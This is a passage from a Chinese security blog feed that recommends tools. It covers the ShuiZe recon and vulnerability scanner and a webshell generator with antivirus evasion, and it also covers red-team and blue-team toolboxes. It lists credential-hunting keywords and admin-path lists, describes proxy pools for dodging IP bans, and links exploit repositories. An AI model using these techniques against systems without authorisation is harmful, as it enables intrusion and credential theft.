url.txt</td><td>对url里的网站漏洞检测</td></tr><tr><td>python3 ShuiZe.py –fofaTitle XXX大学</td><td>从fofa里收集标题为XXX大学的资产，然后漏洞检测</td></tr><tr><td>python3 ShuiZe.py -d domain.com –justInfoGather 1</td><td>仅信息收集，不检测漏洞</td></tr><tr><td>python3 ShuiZe.py -d domain.com –ksubdomain 0</td><td>不调用ksubdomain爆破子域名</td></tr></tbody></table><h2 id="0x06-实现原理"><a href="#0x06-实现原理" class="headerlink" title="0x06 实现原理"></a>0x06 实现原理</h2><ul><li>备案反查顶级域名 -&gt; 获取目标域名相关的其他根域名 -&gt; 接口:<a href="http://icp.chinaz.com/">http://icp.chinaz.com</a></li><li>判断是否是泛解析<ul><li>泛解析-&gt; 不爆破子域名</li><li>不是泛解析 -&gt; 调用ksubdomain爆破子域名(脚本里我用的是linux版本的ksubdomain，文件地址:./Plugins/infoGather/subdomain/ksubdomain/ksubdomain_linux，如果是其他系统请自行替换)</li></ul></li><li>调用theHarvester -&gt; 获取子域名和邮箱列表</li><li>第三方数据接口 -&gt; 获取子域名<ul><li>virustotal -&gt; <a href="https://www.virustotal.com/">https://www.virustotal.com</a> -&gt; 需要api</li><li>ce.baidu.com -&gt; <a href="http://ce.baidu.com/">http://ce.baidu.com</a></li><li>url.fht.im -&gt; <a href="https://url.fht.im/">https://url.fht.im/</a></li><li>qianxun -&gt; <a href="https://www.dnsscan.cn/">https://www.dnsscan.cn/</a></li><li>sublist3r -&gt; <a href="https://api.sublist3r.com/">https://api.sublist3r.com</a></li><li>crt.sh -&gt; <a href="https://crt.sh/">https://crt.sh</a></li><li>certspotter -&gt; <a href="https://api.certspotter.com/">https://api.certspotter.com</a></li><li>bufferover -&gt; <a href="http://dns.bufferover.run/">http://dns.bufferover.run</a></li><li>threatcrowd -&gt; <a href="https://threatcrowd.org/">https://threatcrowd.org</a></li><li>hackertarget -&gt; <a href="https://api.hackertarget.com/">https://api.hackertarget.com</a></li><li>chaziyu -&gt; <a href="https://chaziyu.com/hbu.cn/">https://chaziyu.com/hbu.cn/</a></li><li>rapiddns -&gt; <a href="https://rapiddns.io/">https://rapiddns.io</a></li><li>sitedossier -&gt; <a href="http://www.sitedossier.com/">http://www.sitedossier.com</a></li><li>ximcx -&gt; <a href="http://sbd.ximcx.cn/">http://sbd.ximcx.cn</a></li></ul></li><li>github -&gt; 从github获取子域名，并把查询结果保存到txt-获取敏感信息<ul><li>敏感信息关键字匹配，可在iniFile/config.ini自定义关键字内容，内置如下关键字(‘jdbc:’, ‘password’, ‘username’, ‘database’, ‘smtp’, ‘vpn’, ‘pwd’, ‘passwd’, ‘connect’)</li></ul></li><li>百度和必应爬虫 -&gt; 获取目标后台等地址(‘inurl:admin’, ‘inurl:login’, ‘inurl:system’, ‘inurl:register’, ‘inurl:upload’, ‘后台’, ‘系统’, ‘登录’)</li><li>证书 -&gt; 获取目标关联域名</li><li>子域名友链 -&gt; 获取未爆破出的子域名，未被收录的深层域名</li></ul><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728132752381.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728132752381.png" alt="image-20210728132752381"></a></p><p>整理上面所有的子域名</p><ul><li>对所有子域名判断是否是CDN并解析出A记录</li><li>统计每个c段出现IP的个数</li><li>调用网络空间搜索引擎<ul><li>fofa -&gt; 需要API</li><li>shodan -&gt; 需要API</li></ul></li><li>前面获得的ip反查域名得到相关资产的子域名，整理出所有的子域名和IP</li></ul><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728133047590.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728133047590.png" alt="image-20210728133047590"></a></p><ul><li><p>整理所有资产探测漏洞</p><ul><li><p>Web -&gt; 存活探测</p><ul><li>获取标题<ul><li>自动跑后台路径([‘admin’, ‘login’, ‘system’, ‘manager’, ‘admin.jsp’, ‘login.jsp’, ‘admin.php’, ‘login.php’,’admin.aspx’, ‘login.aspx’, ‘admin.asp’, ‘login.asp’])</li><li>如果URL是IP则查询IP的归属地</li></ul></li><li>漏洞检测 -&gt; Plugins/Vul/Web</li></ul><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728134051049.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728134051049.png" alt="image-20210728134051049"></a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728134115608.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728134115608.png" alt="image-20210728134115608"></a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728134131076.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728134131076.png" alt="image-20210728134131076"></a></p></li><li><p>非Web服务 –&gt; 未授权和弱口令</p></li></ul><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728134212279.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728134212279.png" alt="image-20210728134212279"></a></p></li></ul><p>其他功能</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728134304533.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728134304533.png" alt="image-20210728134304533"></a></p><p>结果展示：</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728132105833.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728132105833.png" alt="image-20210728132105833"></a></p><p>完整流程图:</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/xmind.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/xmind.png" alt="img"></a></p><h2 id="0x07-新增功能"><a href="#0x07-新增功能" class="headerlink" title="0x07 新增功能"></a>0x07 新增功能</h2><p>2021.7.31 增加了Censys接口，需要在iniFile/config.ini的[censys api]中填入API。 功能是获取域名的所有解析IP记录，一是为了Host碰撞，二是更加准确的得到C段IP</p><p>需要censys的api，免费的账户一个月只有250次查询，所以后期需要注意，用完了要更新api</p><p>2021.7.31 增加了Host碰撞访问内网系统漏洞，感谢 <strong>横戈安全团队-小洲</strong> 提交的建议</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/hostCollide.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/hostCollide.png" alt="img"></a></p><p>2021.8.1 修复了CDN判断的bug，感谢 <strong>leveryd 师傅</strong> 提交的bug。</p><p>issues地址：<a href="https://github.com/0x727/ShuiZe_0x727/issues/3">#3</a></p><p>2021.8.3 修复了chinazApi接口请求超时太长的bug，设置默认时间10秒，感谢 <strong>k0njac 师傅</strong>提交的bug。</p><p>issues地址：<a href="https://github.com/0x727/ShuiZe_0x727/issues/11">#11</a></p><p>2021.8.13 增加了获取Github敏感信息地址的作者邮箱，帮助判断是否是目标员工的项目</p><p>2021.8.17 更新了ksubdomain版本，自动选择网卡，不需要重新手动输入网卡</p><p>ksubdomain项目地址：<a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/github_auther.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/github_auther.png" alt="img"></a></p><p>2021.9.1 增加了从fofa中爬去socks代理功能，后续可以手动配合proxychains进行漏洞探测，防止因为被封IP导致漏报。</p><p>感谢 <strong>安恒水滴实验室-1amfine2333师傅</strong> 提供的思路。</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/socksProxy.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/socksProxy.png" alt="img"></a></p><p>2021.9.2 增加了Confluence指纹识别，漏洞利用地址：<a href="https://github.com/h3v0x/CVE-2021-26084_Confluence">https://github.com/h3v0x/CVE-2021-26084_Confluence</a></p><p>2021.9.4 增加了某查接口，对目标的整个架构分析，涵盖【对外投资、控股公司、分支机构、联系方式、邮箱】等信息。</p><p>感谢 <strong>pykiller师傅</strong> 提交的建议，同时参考了 <strong>吐司师傅gubeiya</strong> 的脚本</p><p>issues地址：<a href="https://github.com/0x727/ShuiZe_0x727/issues/25">#25</a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/aiqicha.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/aiqicha.png" alt="img"></a></p><p>2021.9.26 增加了夸克的api接口,-d -c –fofaTitle中都会调用</p><p>限定了每次最大查询数量1000条，不然一个月5w条数据也用不了多少次</p><p>在config.ini配置文件的quake_nums值</p><p>issues地址：<a href="https://github.com/0x727/ShuiZe_0x727/issues/33">#33</a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/quakeApi.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/quakeApi.png" alt="img"></a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/quakeApi2.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/quakeApi2.png" alt="img"></a></p><p>2021.11.30 增加了奇安信hunter的api接口,-d -c –fofaTitle中都会调用</p><p>限定了每次最大查询数量200条，不然一天的几千条数据也用不了多少次</p><p>在config.ini配置文件的qianxin_nums值</p><p>issues地址：<a href="https://github.com/0x727/ShuiZe_0x727/issues/48">#48</a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/qianxinApi2.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/qianxinApi2.png" alt="img"></a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/qianxinApi.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/qianxinApi.png" alt="img"></a></p><p>2022.1.17 修复了certspotter接口获取子域名过滤不严谨的问题</p><p>感谢 <strong>union-cmd师傅</strong> 提交的建议</p><p>issues地址：<a href="https://github.com/0x727/ShuiZe_0x727/issues/57">#57</a></p><p>2022.3.21 更新了fofa api的域名</p><p>2022.3.21 更新了域名备案反查的问题</p><p>2022.3.23 增加了securitytrails接口获取子域名，该接口很强大，建议在config.ini里添加你的api keys</p><p>issues地址：<a href="https://github.com/0x727/ShuiZe_0x727/issues/48">#48</a></p><p>注册地址: <a href="https://docs.securitytrails.com/">https://docs.securitytrails.com/</a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/securitytrails.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/securitytrails.png" alt="img"></a></p><p>感谢 <strong>郭师傅</strong> 提交的建议</p><p>2022.3.23 修复了爱企查无法获取数据的问题</p><p>感谢 <strong>横戈安全团队-chhyx（逗逗）</strong> 的技术支持</p><p>2022.4.13 修复了奇安信测绘语法使用错误的问题</p><p>issues地址：<a href="https://github.com/0x727/ShuiZe_0x727/issues/74">#74</a></p><p>感谢 <strong>cwkiller</strong> 反馈的问题</p><p>2022.4.16 增加了调用Nuclei检测漏洞</p><p>nuclei的参数在iniFile/config.ini配置，默认为<code>nuclei_config = -rl 300 -c 50 -timeout 5 -stats -silent -severity critical,high</code> 根据需求自行修改</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/nuclei_1.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/nuclei_1.png" alt="img"></a></p><p>2022.7.5 Nuclei默认参数配置增加-as</p><p>issues地址: <a href="https://github.com/0x727/ShuiZe_0x727/issues/104">#104</a></p><p>-as 参数，先使用 wappalyzer 进行指纹识别，在进行扫描。</p><p>感谢 <strong>anquanbiji</strong> 反馈的建议</p><p>2022.8.12 ShuiZe增加Dockerfile安装方式</p><p>issues地址: <a href="https://github.com/0x727/ShuiZe_0x727/issues/99">#99</a></p><p>感谢 <a href="https://github.com/1itt1eB0y">@1itt1eB0y</a> 提供的脚本。<strong>安全性自行评估</strong></p><p>2022.8.12 修复了大量反馈aiqicha脚本报错的问题，初步排查是被封IP的原因。</p><p>2022.8.12 修复了quakeApi没有title导致报错的情况</p><p>issues地址: <a href="https://github.com/0x727/ShuiZe_0x727/issues/120">#120</a></p><p>感谢 <strong>Zimba5880</strong> 反馈的建议</p><p>2022.8.20 增加了快代理配置，漏洞检测时会使用快代理的代理池，这样可以避免当前IP被封后导致后续的扫描出现遗漏。</p><p>购买快代理的隧道代理，地址：<a href="https://www.kuaidaili.com/cart?t=tps_c">https://www.kuaidaili.com/cart?t=tps_c</a></p><p>根据自己的需求选择包年包月或者按量付费，更换IP的频率。这里注意并发请求数的，并发数量越高，在配置文件里iniFile/config.ini的thread_num就可以设置的更高。</p><p>假设并发数为5，那么thread_num不要设置超过10，具体的值自己测试。</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/kuaidaili1.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/kuaidaili1.png" alt="img"></a></p><p>购买后查看host、port、username、password，然后填入到配置文件里</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/kuaidaili2.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/kuaidaili2.png" alt="img"></a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/kuaidaili3.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/kuaidaili3.png" alt="img"></a></p><p>默认关闭快代理代理池功能，如果要开启，把switch设置为on，使用快代理代理池时会先验证是否配置正确</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/kuaidaili4.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/kuaidaili4.png" alt="img"></a></p><p>2022.8.27 集成了ObserverWard扫描指纹</p><p>项目地址：<a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></p><p>指纹地址：<a href="https://github.com/0x727/FingerprintHub">https://github.com/0x727/FingerprintHub</a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/ObserverWard1.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/ObserverWard1.png" alt="img"></a></p><h2 id="0x08-反馈"><a href="#0x08-反馈" class="headerlink" title="0x08 反馈"></a>0x08 反馈</h2><p>ShuiZe（水泽） 是一个免费且开源的项目，我们欢迎任何人为其开发和进步贡献力量。</p><ul><li>在使用过程中出现任何问题，可以通过 issues 来反馈。</li><li>Bug 的修复可以直接提交 Pull Request 到 dev 分支。</li><li>如果是增加新的功能特性，请先创建一个 issue 并做简单描述以及大致的实现方法，提议被采纳后，就可以创建一个实现新特性的 Pull Request。</li><li>欢迎对说明文档做出改善，帮助更多的人使用 ShuiZe。</li><li>贡献代码请提交 PR 至 dev 分支，master 分支仅用于发布稳定可用版本。</li></ul><p><em>提醒：和项目相关的问题最好在 issues 中反馈，这样方便其他有类似问题的人可以快速查找解决方法，并且也避免了我们重复回答一些问题。</em></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webshell_Generate-支持生成Webshell并且自带免杀!</title>
      <link href="/2024/03/07/32-Webshell%E5%85%8D%E6%9D%80/"/>
      <url>/2024/03/07/32-Webshell%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Github官网"><a href="#Github官网" class="headerlink" title="Github官网:"></a>Github官网:</h2><p><a href="https://github.com/cseroad/Webshell_Generate">https://github.com/cseroad/Webshell_Generate</a></p><h2 id="Github下载链接"><a href="#Github下载链接" class="headerlink" title="Github下载链接:"></a>Github下载链接:</h2><p><a href="https://github.com/cseroad/Webshell_Generate/releases/tag/v1.2.4">https://github.com/cseroad/Webshell_Generate/releases/tag/v1.2.4</a></p><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h3 id="java版本-1-8"><a href="#java版本-1-8" class="headerlink" title="java版本-1.8"></a>java版本-1.8</h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdk-1.8</span><br></pre></td></tr></tbody></table></figure><p>运行命令:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar XXXXXX.jar</span><br></pre></td></tr></tbody></table></figure><p>直接下载releases版即可</p><p><a href="https://github.com/cseroad/Webshell_Generate/blob/main/images/Snipaste_2023-02-25_14-29-13.jpg"><img src="https://github.com/cseroad/Webshell_Generate/raw/main/images/Snipaste_2023-02-25_14-29-13.jpg" alt="image-20220519102709278"></a></p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><ul><li>兼容java.util 和 sun.misc 两个包</li><li>jsp部分将404状态码修改为按钮，默认返回200状态码</li><li>新增AntSword_jspjs无jsp标签webshell</li><li>新增asmx_Godzilla_CSHAP_ASMX_AES_BASE64 webshel</li><li>优化部分免杀代码</li></ul><h2 id="2024-3-2更新"><a href="#2024-3-2更新" class="headerlink" title="2024.3.2更新"></a>2024.3.2更新</h2><ul><li>优化部分免杀代码</li><li>jsp部分通过OrderClassLoaders类调用defineClass方法</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>参考了诸多大佬的文章、工具、思路，如</p><p><a href="https://github.com/CrackerCat/JSPHorse">https://github.com/CrackerCat/JSPHorse</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass">https://github.com/LandGrey/webshell-detect-bypass</a></p><p><a href="https://github.com/czz1233/GBByPass">https://github.com/czz1233/GBByPass</a></p><p><a href="https://github.com/pureqh/Troy">https://github.com/pureqh/Troy</a></p><p><a href="http://yzddmr6.com/posts/jsp-webshell-upload-bypass/">http://yzddmr6.com/posts/jsp-webshell-upload-bypass/</a></p><p><a href="https://xz.aliyun.com/t/10937">https://xz.aliyun.com/t/10937</a></p><h2 id="Star-History"><a href="#Star-History" class="headerlink" title="Star History"></a>Star History</h2><p><a href="https://star-history.com/#cseroad/Webshell_Generate&amp;Date"><img src="https://camo.githubusercontent.com/1946b674268e5a5a34c3db04bd56faefdefe52f5219847f8bc9e274010894fdf/68747470733a2f2f6170692e737461722d686973746f72792e636f6d2f7376673f7265706f733d637365726f61642f5765627368656c6c5f47656e657261746526747970653d44617465" alt="Star History Chart"></a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队工具箱-狐狸安全团队魔改</title>
      <link href="/2024/03/06/35-%E7%BA%A2%E9%98%9F%E5%B7%A5%E5%85%B7%E7%AE%B1-%E7%8B%90%E7%8B%B8-%E9%AD%94%E6%94%B9/"/>
      <url>/2024/03/06/35-%E7%BA%A2%E9%98%9F%E5%B7%A5%E5%85%B7%E7%AE%B1-%E7%8B%90%E7%8B%B8-%E9%AD%94%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="该工具已授权"><a href="#该工具已授权" class="headerlink" title="该工具已授权:"></a>该工具已授权:</h2><p><img src="https://pic.imgdb.cn/item/65e838419f345e8d037d8f1f.jpg" alt="授权"></p><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>在4.0版本以及星球专版的基础上重新规划了工具箱，去除了一些工具，新增些许新工具以及旧工具的新版本，修复部分已知BUG。</p><p>此工具为python语言编写，代码也留下了，未对代码进行加密，可二次开发，无任何后门，不要以谣传谣，代码都是开放的，不放心的师傅可以自行查看哈~~~</p><p>魔改版作者：狐狸&amp;雨夜</p><p>团队官方网站：<a href="https://www.one-fox.cn/">https://www.one-fox.cn/</a></p><h3 id="0x02-下载"><a href="#0x02-下载" class="headerlink" title="0x02 下载"></a>0x02 下载</h3><p>ONE-FOX集成工具箱_V5魔改版_by狐狸<br>百度网盘下载地址：<a href="https://pan.baidu.com/s/1ZKuGpSqH2kL57Er84gouaw?pwd=ofox">https://pan.baidu.com/s/1ZKuGpSqH2kL57Er84gouaw?pwd=ofox</a><br>后续加入github项目地址<br>感谢各位师傅的支持</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝队工具箱-知攻擅防实验室开发</title>
      <link href="/2024/03/05/37-%E8%93%9D%E9%98%9F%E7%BB%BC%E5%90%88%E5%B7%A5%E5%85%B7%E7%AE%B1/"/>
      <url>/2024/03/05/37-%E8%93%9D%E9%98%9F%E7%BB%BC%E5%90%88%E5%B7%A5%E5%85%B7%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<p>*<strong>1*</strong></p><p><strong>蓝队工具箱 v2024.1</strong></p><p>公众号:知攻擅防实验室</p><p>*<strong>2*</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>简介</strong></p><p>蓝队工具箱是为打造一款专业级应急响应的集成多种工具的工具集，由真实应急响应环境所用到的工具进行总结打包而来，由 ChinaRan404,W 啥都学,清辉等开发者编写.把项目现场中所用到的工具连同环境一同打包，并实现“可移植性”“兼容性”“使用便捷”等优点。</p><p>集成模块：“常用工具”,“流量分析”,“应急响应”,“日志分析”,“逆向分析”,“检测规则”,“上传应急”,“蓝队思路图”,”安装文档“,“临时笔记”等 10 个模块。</p><p>*<strong>3*</strong></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p><strong>更新内容</strong></p><p>1.修复 Windows 日志一键分析工具依赖问题</p><p>2.更新 FastBT 红队指纹快速识别工具为最新版本</p><p>3.更新蓝队分析辅助包（ABC_123）</p><p>4.修复不同分辨率窗口打开不完全问题，改用相对大小进行启动，确保每台系统都可以启动</p><p>5.修复 Wireshark 部分系统抓不到包问题</p><p>6.更新火绒剑离线版本</p><p>7.新增安服仔摸鱼功能（彩蛋形式）</p><p>8.新增启动延时动画</p><p>9.关闭流量在线分析功能</p><p>10.更新 UI 颜色</p><p>*<strong>4*</strong></p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><p><strong>使用展示</strong></p><p>本工具箱使用语言为 python，调用 tk 模块实现 GUI 界面</p><p>开发环境：</p><p>python3.8</p><p>Windows10</p><p>直接双击打开“蓝队工具箱.exe”或“Tools.bat”即可</p><p>如自行需自行自定义工具，请看下文</p><p>*<strong>4.1*</strong></p><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><p><em><strong>*使用截图*</strong></em></p><p>**<br>**</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnbogjaFZ5zX0hh0bPBHHibgBvz56PDhDkyD9DLOQu4MVWfQlDPC9xN1g/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVngpkwde1Dr4sztMvNgTZ3IbIJNfu1gzJ1yBujQZypicKZ5ewR2YibWs7g/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnVGLianiaKSzbcX79EH8vUllrYrfXQ94QK02mtEJCJoKFbxZj6ticoOCOQ/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVn5cAYiaWiawJT7VoUqgXVHhHYiadUibLUqVCweQEp3EsGnzfGiarZ967rb8g/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnz4dyftBELDnnFA2clfe8kq4RCJ5nRiaT7Ik8B4wlEgQiadicyp6Px1b3g/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnk8Qn8etxmBg3R40kZclpFKn8ic1K2EL6X8sPLk3OgYR23Bf3hCFoicrw/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnztpibEPstibXcCMa5hic6HRMHibyS7APibyDibicdNZ8GTl5Z0ID7f7Nsicc2w/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVn8T1OfIia1UcWBOLiazrO1T48KKPGQUUT5TlLerNeF9DBgpEmuiakHFZ3Q/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnzA3OVKVZEt3qvd87llV6jmSs2JSbc05nIAMibFygWMdzCVB6Gva1ia7Q/640?wx_fmt=png&amp;from=appmsg&amp;wxfrom=13&amp;tp=wxpic" alt="img"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnegbXuB9w9lZ9SLo9nopfXlEjbmicgXzx33aibM3ZG9vicTdpxtJx0uMAQ/640?wx_fmt=png&amp;from=appmsg&amp;wxfrom=13&amp;tp=wxpic" alt="img"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnfDeiabiaehVVnMsfG78WImRAH8JK8EH2RTA65PrvsRAZQBiadxiaLKU9Dw/640?wx_fmt=png&amp;from=appmsg&amp;wxfrom=13&amp;tp=wxpic" alt="img"></p><p>*<strong>4.2*</strong></p><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><p><em><strong>*关注联动“红队工具箱”*</strong></em></p><p>本工具箱可联动“OneFox 工具箱”</p><p>红队工具箱请在公众号“狐狸说安全”获取</p><p><img src="http://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZfSsAKPHycBWibEuQqXvaljjkaZiaKibSHKhkQIV7fU0VbnaVILAOc3YtVSCKC9eT7qjpJSMh42Hurw/300?wx_fmt=png&amp;wxfrom=19" alt="img"></p><p><strong>狐狸说安全</strong></p><p>隶属于One-Fox安全团队旗下 致力于红蓝对抗，WEB安全渗透测试，内网渗透，钓鱼社工，定期分享原创工具与分享他人常用开源安全工具和教程等前沿网络安全资源。</p><p>143篇原创内容</p><p>公众号</p><p>请确保目录关系正确</p><p>将红队工具箱放置 onefox 目录下即可。</p><p>  BlueTeamTools</p><p>​      –images</p><p>​      –Java_path         </p><p>​      –onefox</p><p>​      –Python38</p><p>​      –Tools</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnP3zU7aNxAoib8ia2pBib4lkiczrZTjENzCyavUNLXsbsFFhQrUX594xhFw/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7voGgiaGLy41kO9b8kNA9qGVnE01YgTN8Ajx7iaolcM3aU4JjfqwP9OT8KK6x9jhrdR85WANJmfSic9kA/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>*<strong>5*</strong></p><h2 id="-5"><a href="#-5" class="headerlink" title=""></a></h2><p><strong>FAQ</strong></p><p>1.怎么联动红队工具箱？</p><p>答：请仔细阅读上文</p><p>2.我有该版本的上一个版本，我可以直接更新吗？</p><p>答：可以，下载地址内提供了升级包</p><p>3.是否可以提相关意见？</p><p>答：可以，软件主体内有开发者联系方式</p><p>4.我是否想把指定工具 copy 出来，可以吗？</p><p>答：工具都在 Tools 目录里面，自己找一下进程名，然后直接搜索文件即可。</p><p>*<strong>6*</strong></p><h2 id="-6"><a href="#-6" class="headerlink" title=""></a></h2><p><strong>下载地址</strong></p><p>关注公众号“知攻善防实验室”，后台回复“蓝队工具箱”</p><p>Github地址：<br><a href="https://github.com/ChinaRan0/BlueTeamTools">https://github.com/ChinaRan0/BlueTeamTools</a><br>下载地址：<br><a href="https://pan.quark.cn/s/79bf7575af88">https://pan.quark.cn/s/79bf7575af88</a><br>建议转存后下载，速度更快。<br>如有BUG联系：Admin_Ran<br>回复“交流群”获取技术交流群链接</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>amass-一款变异又有维护的信息收集工具!</title>
